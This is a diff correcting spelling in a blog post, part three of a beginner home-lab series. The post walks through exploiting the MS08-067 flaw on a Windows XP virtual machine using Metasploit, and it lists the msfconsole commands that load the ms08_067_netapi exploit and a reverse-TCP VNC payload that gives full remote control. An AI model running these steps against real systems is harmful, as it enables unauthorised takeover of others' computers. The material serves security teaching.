@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "First Hack Part 3 (Exploiting The Vulnurability)"
+title:  "First Hack Part 3 (Exploiting The Vulnerability)"
 date:   2018-03-28 14:56:03 -0400
 categories: jekyll update
 ---
@@ -8,23 +8,23 @@ categories: jekyll update
 <br>[Part 1 (Installing The Virtual Network)][part-1]
 <br>[Part 2 (Searching for Targets and their Weaknesses)][part-2]
 
-Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise you would be commiting an illegal act.
+Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise, you would be committing an illegal act.
 
-Now that we have sucessfully obtained a list of all the vulnurabilities, we are going to use one of the bigger ones. You could use more than one of the critical vulnurabilities in Nessus but we are going to use MS08_067
+Now that we have successfully obtained a list of all the vulnerabilities, we are going to use one of the bigger ones. You could use more than one of the critical vulnerabilities in Nessus but we are going to use MS08_067
 
 <b>Finding The Commands To Hack Windows XP
 
-Once we have the codes, we need to look them up in the "Rapid 7" database. Rapid 7 is a company that develops a cool called Metasploit, which is the tool we use to actually hack another computer. We are going to use a tool called a VNC (Virtual Network Computing). This is a window that contains the remote operating system. It allows mouse and keyboard controlls, much like the virtual machine you are using now.
+Once we have the codes, we need to look them up in the "Rapid 7" database. Rapid 7 is a company that develops a cool called Metasploit, which is the tool we use to actually hack another computer. We are going to use a tool called a VNC (Virtual Network Computing). This is a window that contains the remote operating system. It allows mouse and keyboard controls, much like the virtual machine you are using now.
 
-First, go to the [Rapid7 Vulnurabilities & Exploit Database][Rapid7-DB]
+First, go to the [Rapid7 Vulnerabilities & Exploit Database][Rapid7-DB]
 
-Type in the vulnurability code we want to use. In our particular case, it is MS08_067
+Type in the vulnerability code we want to use. In our particular case, it is MS08_067
 
-In the dropdown menue to the right of the search field, choose "Metasploit Moduels"
+In the drop-down menu to the right of the search field, choose "Metasploit Modules"
 
-Look under "Moduel Name" and identify the code exploit/windows/smb/ms08_067_netapi. We will use this later
+Look under "Module Name" and identify the code exploit/windows/smb/ms08_067_netapi. We will use this later
 
-<b>Loading Exploits and Payloads
+<b>Loading Exploits and Payloads</b>
 <br>[Offensive Security - Metasploit Commands][Metasploit-Commands]
 <br>[Offensive Security - Using Exploits][Using-Exploits]
 
@@ -40,7 +40,7 @@ Wait for it to load then type in the following
 use exploit/windows/smb/ms08_067_netapi
 {% endhighlight %}
 
-Next we will need to use a payload. A payload is basicly software that takes advantage of the exploit. So type
+Next we will need to use a payload. A payload is basic software that takes advantage of the exploit. So type
 
 {% highlight ruby %}
 set PAYLOAD /windows/vncinject/reverse_tcp
@@ -59,7 +59,7 @@ You should get something like the image below
 
 ![image tooltip](/blog/images/ms08_067/msfconsole_show_options1.JPG)
 
-You may notice that a fiew of the fields are empty. RHOST and LHOST. RHOST is the remote host. The IP of the target computer. LHOST is the local host. Your computer.
+You may notice that a few of the fields are empty. RHOST and LHOST. RHOST is the remote host. The IP of the target computer. LHOST is the local host. Your computer.
 
 You may not know your own IP. So open a new terminal tab with Ctrl+Shift+T and type
 
@@ -81,7 +81,7 @@ set RHOST 192.168.1.244
 set LHOST 192.168.1.48
 {% endhighlight %}
 
-We have everything we need right? Just one more setting. This will allow us to controll the computer rather than simply spy on it.
+We have everything we need right? Just one more setting. This will allow us to control the computer rather than simply spy on it.
 
 {% highlight ruby %}
 set ViewOnly false
@@ -99,7 +99,7 @@ Run the following command.
 exploit
 {% endhighlight %}
 
-Congradulations. You did it! You can now do whatever you like to the target computer.
+Congratulations. You did it! You can now do whatever you like to the target computer.
 
 ![image tooltip](/blog/images/ms08_067/owned.JPG)
 
@@ -111,6 +111,3 @@ Congradulations. You did it! You can now do whatever you like to the target comp
 [Rapid7-DB]: https://www.rapid7.com/db
 [Using-Exploits]: https://www.offensive-security.com/metasploit-unleashed/exploits/
 [Metasploit-Commands]: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
-
-
-
